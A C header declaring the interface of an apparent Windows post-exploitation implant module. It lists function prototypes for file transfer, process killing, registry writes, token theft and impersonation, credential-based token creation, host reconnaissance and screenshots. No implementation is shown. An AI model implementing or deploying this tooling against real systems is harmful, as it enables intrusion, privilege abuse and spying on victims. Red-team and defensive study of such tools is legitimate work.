#ifndef POSTEX_H
#define POSTEX_H

#include <windows.h>
#include <stddef.h>

int postex_upload(const char *remote_path, const void *data, size_t len);
int postex_download(const char *remote_path, void **out_data, size_t *out_len);
int postex_ls(const char *path, void **out_data, size_t *out_len);
int postex_rm(const char *path);
int postex_mkdir(const char *path);
int postex_cp(const char *src, const char *dst);
int postex_mv(const char *src, const char *dst);
int postex_pwd(char *buf, size_t capacity);
int postex_cd(const char *path);

int postex_ps(void **out_data, size_t *out_len);
int postex_kill(DWORD pid);
int postex_getpid(void);

int postex_reg_read(const char *key, const char *value, void **out_data, size_t *out_len);
int postex_reg_write(const char *key, const char *value, DWORD type, const void *data, size_t len);

int postex_whoami(char *buf, size_t capacity);
int postex_steal_token(DWORD pid);
int postex_rev2self(void);
int postex_make_token(const char *domain, const char *user, const char *pass);

int postex_env(void **out_data, size_t *out_len);
int postex_hostname(char *buf, size_t capacity);

int postex_screenshot(void **out_data, size_t *out_len);

#endif
